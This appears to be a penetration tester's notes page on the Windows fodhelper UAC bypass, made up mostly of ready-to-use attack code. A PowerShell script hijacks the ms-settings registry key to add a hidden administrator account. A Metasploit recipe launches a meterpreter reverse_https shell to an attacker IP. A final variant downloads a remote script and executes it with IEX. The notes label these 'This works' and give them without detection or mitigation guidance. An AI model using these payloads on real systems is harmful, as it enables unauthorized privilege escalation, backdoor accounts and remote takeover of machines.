# UAC Bypass



## FodHelper UAC Bypass

This works

{% code overflow="wrap" %}
```powershell
[string]$custom = "cmd.exe /c net user test123 Password123! /add && net localgroup administrators test123 /add"
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $custom -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```
{% endcode %}

[https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/](https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/)

### **Manual POC (Broken)**

{% code overflow="wrap" %}
```powershell
# Create registry path
New-Item -Path HKCU:\Software\Classes\mssettings\shell\open\command -Value powershell.exe â€“Force
# Create DelegateExecute value
New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force
# Launch a high-integrity PowerShell prompt with fodhelper.exe
C:\Windows\System32\fodhelper.exe
```
{% endcode %}

### **Metasploit (Working without Defender)**

```bash
# Use Shellcode runner to obtain Meterpreter Shell
# Launch fodhelper UAC bypass module
use exploit/windows/local/bypassuac_fodhelper
# Select correct target
show targets
# Set for 64bit
set target 1
# List active sessions
sessions -l
# Set the session
set session 1
# Set the payload
set payload windows/x64/meterpreter/reverse_https
# Set the lhost variable
set lhost 192.168.49.204
# Set the lport variable
set lport 8443
# Run the exploit
run
```

## Improving FodHelper (Doesn't seem to work)

{% code overflow="wrap" %}
```powershell
# Generate Reverse Shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=443 EXITFUNC=thread -f ps1
# Setup Metasploit Handler
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LPORT 443
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru
exploit
# Create registry path
New-Item -Path HKCU:\Software\Classes\mssettings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force
# Create DelegateExecute value
New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force
# Launch a high-integrity PowerShell prompt with fodhelper.exe
C:\Windows\System32\fodhelper.exe
```
{% endcode %}
